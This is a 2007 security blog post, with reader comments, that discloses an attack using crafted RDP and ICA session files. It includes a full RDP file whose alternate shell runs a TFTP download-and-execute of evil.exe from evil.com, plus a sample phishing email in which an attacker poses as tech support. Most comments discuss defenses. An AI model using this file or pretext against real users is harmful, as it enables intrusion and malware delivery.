<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Remote Desktop Command Fixation Attacks</title><meta name="description" content="The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in."><meta property="name" content="Remote Desktop Command Fixation Attacks"><meta itemprop="name" content="Remote Desktop Command Fixation Attacks"><meta property="description" content="The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in."><meta itemprop="description" content="The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fremote-desktop-command-fixation-attacks%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fremote-desktop-command-fixation-attacks%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/remote-desktop-command-fixation-attacks/"><meta property="og:title" content="Remote Desktop Command Fixation Attacks"><meta property="og:description" content="The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fremote-desktop-command-fixation-attacks%2F?w=1024"><meta name="twitter:title" content="Remote Desktop Command Fixation Attacks"><meta name="twitter:description" content="The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fremote-desktop-command-fixation-attacks%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/blog/">Blog</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Remote Desktop Command Fixation Attacks</h1><div class="date">Wed, 10 Oct 2007 11:00:42 GMT</div><div class="author">by pdp</div><div id="post-content"><p>The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in.</p>
<p>Both, RDP and ICA, contain information not only about what servers to connect to but also what applications to launch after successful authentication. These parameters can be modified to suit the attacker needs. In CITRIX we can specify the default shell command by using the parameter <strong>Application</strong> (i.e <code>Application=calc.exe</code>). In Windows Remote Desktop we can do exactly the same with the <strong>alternate shell</strong> (i.e <code>alternate shell:s:cmd.exe</code>) directive. Here follows a sample ICA file:</p>
<pre><code>[WFClient]
Version=1

[ApplicationServers]
Connection To Citrix Server=

[Connection To Citrix Server]
InitialProgram=**some command here**
Address=_172.16.3.191_

ScreenPercent=0

In Windows Terminal Services, the same can be achieved with the following example:

screen mode id:i:1
desktopwidth:i:800
desktopheight:i:600
session bpp:i:16
full address:s:_172.16.3.191_
compression:i:1
keyboardhook:i:2
alternate shell:s:**some command here**
shell working directory:s:_C:\_
bitmapcachepersistenable:i:1

This is all that the attacker needs to know. Let&#39;s have a step-by-step look at the attack structure, shall we:</code></pre><ol>
<li><p><strong>Compose a malicious Remote Desktop session file:</strong>
The following example instructs TFTP to connect to <strong>evil.com</strong> and retrieve a file called <strong>evil.exe</strong>. Once the download is completed, the attacker executes <strong>evil.exe</strong> and subsequently terminates the session:
screen mode id:i:1
desktopwidth:i:800
desktopheight:i:600
session bpp:i:16
full address:s:<em>172.16.3.191</em>
compression:i:1
keyboardhook:i:2
alternate shell:s:<strong>cmd.exe /C &quot;tftp -i evil.com GET evil.exe evil.exe &amp; evil.exe&quot;</strong>
shell working directory:s:<em>C:\</em>
bitmapcachepersistenable:i:1</p>
</li>
<li><p><strong>Send email to the victim:</strong>
Here the attacker uses his social engineering skills to persuade the victim into opening and authenticating the session file. This is how it is done:</p>
<blockquote>
<p>Hello John,</p>
<pre><code>This is Tim from Tech Department. I was informed that you have some problems with your remote desktop connectivity. I&#39;ve attached a modified RDP file you can tryout and see if it works. Just double click on the file and login. Your domain credentials should work. Let me know if you have any problems.

Tim O&#39;Brian</code></pre><p>Tech Department</p>
</blockquote>
</li>
<li><p><strong>Own it:</strong>
The attacker notices a new entry in his TFTP log files. The operation was successful. Now he can take full advantage of his brand new asset. &quot;Simple tricks always work.&quot;</p>
</li>
</ol>
<p><em>This is it. This is what I would like to refer to as &quot;Remote Desktop Command Fixation Attacks&quot;. They are simple, highly affective, unknown to system administrators (as of yet), and pretty vicious. Keep in mind that the same procedure apply to CITIRX as well.</em></p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">now when I am thinking this trick should be called <q>Remote Desktop Shell Fixation Attacks</q></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=256&amp;d=retro" alt="djteller"><span class="post-comment-author">djteller</span><div class="post-comment-content">What can we do about it ? -&gt; Educate users.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">djteller, :) yeh right. first of all you have to educate the administrators. What I am trying to show here is how easy it is sometimes to gain remote access without too much effort. The security community and industry in general is sooo much into vulnerability research that they forget to look at the most obvious, the most simplistic, and the most successful threats. Who needs 0days when Andrea Johnson, the secretary from 3rd floor, will unawarely let you in?

Moreover, most people have never heard of Windows Terminal services. The don't know how they even look like. So, what's going to happen if the attacker just spawns a full-screen session on their desktop? They will probably think that somehow they logged out; type their username and password, and of course let the attacker in. Simple and effective.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/57239820b18ae644b7cc5c1df8ab96f7?s=256&amp;d=retro" alt="rkd"><span class="post-comment-author">rkd</span><div class="post-comment-content"><blockquote>Filter emails and email content and in general traffic that contains RDP or ICA files. Yes it sounds simple, but it is almost impossible to implement.</blockquote>

I hate to be asking an obvious question but why is it that filtering *.rdp/*.ica (or whatever the ica extension is) is impossible?
As far as I know Outlook 2007 (the client itself) strips this attachments by itself...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">rkd, because the attacker may simply include a link to a remote RDP/ICA file which the user will click on. Of course it gets more suspicious but users will still fall for it. No to mention that RDP and ICA can be delivered to the target in multiple ways.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ddb2d5a5ac2b06e443460be3fe37b769?s=256&amp;d=retro" alt="mvs"><span class="post-comment-author">mvs</span><div class="post-comment-content">Any email that urges you to "click this" is a potential attack vector. The barn door was opened when email morphed beyond delivering plain ASCII text. The solution is to block any email that is not plain ASCII. Since users cry when you take their candy away, computers will never be secure. End of story. Get used to it.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/9bac8baa8ae20d56ec0320a2f2c33c82?s=256&amp;d=retro" alt="fazed"><span class="post-comment-author">fazed</span><div class="post-comment-content">hey i posted about something like this on my blog:
http://fazed-darkstar.blogspot.com/2007/10/phishing-windows-passwords-with-citrix.html

it basically rely's on social engineering.
but this is a bit more indepth, nice!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b2c0b0c6b90fc3f3fa6abae420c36cc0?s=256&amp;d=retro" alt="Larry Seltzer"><span class="post-comment-author">Larry Seltzer</span><div class="post-comment-content">Before I saw rkd's message I went to test the Outlook attachment stripping on Outlook 2003 and it does not strip .rdp files. 

I see that the attack has a hard IP address in it, and of course the attacker would need to know either a name or address. In a corporation this is likely to be a gateway I guess and not a big secret.

I also noticed the "working directory:s:C:\". Some of us don't have download and execute rights in our root directories. Is there a more elegant approach to this? Is %TEMP% supported here?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/bbbfc965f4e0aee9dcf3fb16d6dee0b5?s=256&amp;d=retro" alt="d4brain"><span class="post-comment-author">d4brain</span><div class="post-comment-content">Hey, so great Image at the Top ;)And the tricks and infos too...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1e41c58e98f24908060130e58333e07a?s=256&amp;d=retro" alt="LonerVamp"><span class="post-comment-author">LonerVamp</span><div class="post-comment-content">If you truly believe security in depth (defense in depth is the common usage), then what are you envisioning? That we have one perfect security measure that is unbreakable? I'm not sure about you, but with the rest of the security industry, it is pretty accepted that there is no silver bullet.

We need and will always need layered defense in order to protect data and systems when one layer is thwarted.

You might say that people will always be a weak link, and that could be true even in an environment with security in depth. In fact, security in depth is even more needed due to the human factor. If people can make stupid mistakes, put up roadblocks, nets, and pointy objects in their way so they don't stupidly make those mistakes...

Perhaps you have a different definition of "security in depth," in which case I beg that you explain it so that everyone can move beyond focusing on that statement. Maybe we're really on the same page and just have different meanings to this rather common security term...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">LonerVamp, I am putting a post now, which explains everything in more detail. Thanks.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5453ee5881fd8b42b5ab208ca90ae1cb?s=256&amp;d=retro" alt="Der Klempner"><span class="post-comment-author">Der Klempner</span><div class="post-comment-content">I'am a little curious - why should my firewall policies allow to forward such outbound connections - and moreover - why should i expose my rdp/ica servers without additional protection (e.g. VPN/certificates) to the outside.

Security comes with layers of it.

Der Klempner</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f42d8b6838137a6c7644794b34785ace?s=256&amp;d=retro" alt="Scott"><span class="post-comment-author">Scott</span><div class="post-comment-content">An easy way to defend this is with an IPS that will shun RDP traffic on 3389 or detecting RDP over a non standard port. 

There is a rule on Bleeding Snort to do this.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/f8e89ac87f640d2eb16c52d2714795f6?s=256&amp;d=retro" alt="Rogers"><span class="post-comment-author">Rogers</span><div class="post-comment-content">Isn't most Citrix-servers set up to NOT allow users to install or execute unknown applications? Will the user be allowed to execute cmd.exe and download and run an unknown file?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/37b5ef749ebd516e99541d628fb21311?s=256&amp;d=retro" alt="Changlinn"><span class="post-comment-author">Changlinn</span><div class="post-comment-content">Most terminal servers I set up are restricted too, so the user can't run cmd.exe and evil.exe, only a set of programs specified... of course one of those because of business requirements is Internet Explorer, so game over right there. It is an interesting exploit, but not one that would necessarily work 100% of the time. Could you just MIM them, ie change the citrix/rdp to connect to a server on your network through port 443, then you redirect and capture their user/pass.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2c3da3c02949e8bc19c6f88ede82f247?s=256&amp;d=retro" alt="Jesus"><span class="post-comment-author">Jesus</span><div class="post-comment-content">This is a perfect example of why firewalls should have egress filtering and blocking of executable files.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2021 <a href=""></a>. All rights reserved.</p></footer></body></html>